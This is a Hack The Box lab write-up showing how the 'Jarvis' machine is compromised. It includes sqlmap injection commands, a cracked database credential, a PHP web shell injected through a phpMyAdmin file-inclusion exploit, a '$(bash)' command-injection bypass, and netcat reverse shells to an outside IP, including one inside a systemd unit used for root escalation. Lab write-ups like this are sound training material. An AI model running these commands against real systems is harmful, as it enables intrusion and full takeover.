---
"title": "Hack The Box - Jarvis"
"date": 2020-04-04
"tags": ["linux", "medium", "sudo", "setuid", "sqli", "phpmyadmin", "python"]
"keywords": ["linux", "medium", "sudo", "setuid", "sqli", "phpmyadmin", "python"]
"categories": ["HackTheBox OSCP-Like"]
"author": "Ghostbyt3"
"description": "We are going to pwn Jarvis from Hack The Box."
"featured_image": "/img/htb-jarvis/1.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox OSCP-Like - Writeup"
---


![Untitled](/img/htb-jarvis/1.png)

We are going to pwn Jarvis from Hack The Box.

Link : [https://www.hackthebox.eu/home/machines/profile/194](https://www.hackthebox.eu/home/machines/profile/194)


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.13 (94%), Linux 3.16 (94%), Linux 3.18 (94%), Linux 4.2 (94%), Linux 3.12 (93%), Linux 3.8 - 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP:

It looks like a normal webpage. So better we try bruteforcing the directories.[br/](br/)
![Untitled](/img/htb-jarvis/2.png)

Got some details on the bottom of the page.[br/](br/)
![Untitled](/img/htb-jarvis/3.png)

## Gobuster Result:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/03 19:14:12 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/03 19:15:59 Finished
===============================================================
```

``/phpmyadmin``[br/](br/)
![Untitled](/img/htb-jarvis/4.png)
Tried with default credentials ``Username: root Password: [null]`` but failed so better we try to enumerate more.

In the webpage clicking on ``Rooms`` it redirects to ``rooms-suites.php`` and by clicking any of those rooms it redirects to ``/room.php`` with a parameter called cod that holds the room number.[br/](br/)
![Untitled](/img/htb-jarvis/5.png)

So I started SQLMAP with the url. There is some kind of filter which Ban us for 90 seconds.
![Untitled](/img/htb-jarvis/6.png)

>sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --level 5 --risk 3

![Untitled](/img/htb-jarvis/7.png)
And it give me some payload. It Looks like SQL Injection using UNION is there.

### What is SQL Injection using UNION?
>When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database.

> sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --level 5 --risk 3 --password

Got ``DBadmin`` hash.[br/](br/)
![Untitled](/img/htb-jarvis/9.png)

I cracked that using [CrackStation](https://crackstation.net/)[br/](br/)
![Untitled](/img/htb-jarvis/10.png)

``/phpmyadmin``[br/](br/)

``DBadmin:imissyou``[br/](br/)
![Untitled](/img/htb-jarvis/11.png)

Found Phpmyadmin's version so search for any exploit available.[br/](br/)
![Untitled](/img/htb-jarvis/12.png)

>[https://www.exploit-db.com/exploits/44928](https://www.exploit-db.com/exploits/44928)

According to the exploit we need to inject the payload in SQL Query.[br/](br/)
```select '[?php system($_GET["cmd"]);?](?php system($_GET["cmd"]);?)'```
![Untitled](/img/htb-jarvis/13.png)

![Untitled](/img/htb-jarvis/14.png)

Now we need to get the Session ID of phpMyAdmin.[br/](br/)
![Untitled](/img/htb-jarvis/15.png)

``http://supersecurehotel.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_8271hfci8stuji9h69a2huedmt4dt75e&cmd=ls``
![Untitled](/img/htb-jarvis/16.png)

Its working lets try to get reverse shell!

## Shell as www-data

``nc -e /bin/sh 10.10.14.19 1234``

I got the shell as ``www-data``[br/](br/)
![Untitled](/img/htb-jarvis/17.png)


I started with ``sudo -l`` and looks like we can run ``simpler.py`` as pepper without password.
![Untitled](/img/htb-jarvis/18.png)

Lets see how ``simpler.py`` works[br/](br/)
```
python simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    
```
While checking the python code, I found a Interesting thing:
```
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

It takes the input and ping the command we send and it also forbidden ``['&', ';', '-', '`', '||', '|']`` these symbols to prevent us to do some other commands.But they didn't filtered ``$``, we can use this by ``$(command)``. I did ``$(bash)`` and got the user ``pepper``.

```
$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: 127.0.0.1 $(bash)
127.0.0.1 $(bash)
pepper@jarvis:/var/www/Admin-Utilities$ whoami
whoami
pepper@jarvis:/var/www/Admin-Utilities$
pepper
```

## Privilege Escalation

Started my enumeration script and found there is a SUID binary.[br/](br/)
![Untitled](/img/htb-jarvis/19.png)

I checked [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/), According to that we need to create a service that executes a file of our choice when it enables.
I created a service called ``test.service`` in my machine and uploaded that to the box.

``test.service``
```
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -e /bin/sh 10.10.14.19 5555"
[Install]
WantedBy=multi-user.target
```

Uploaded the script to the box and gave executable permission. Now we need to link the service first and then enable the service which executes it.[br/](br/)
![Untitled](/img/htb-jarvis/20.png)

Started my listener[br/](br/)
![Untitled](/img/htb-jarvis/21.png) [br/](br/)
I'm Root

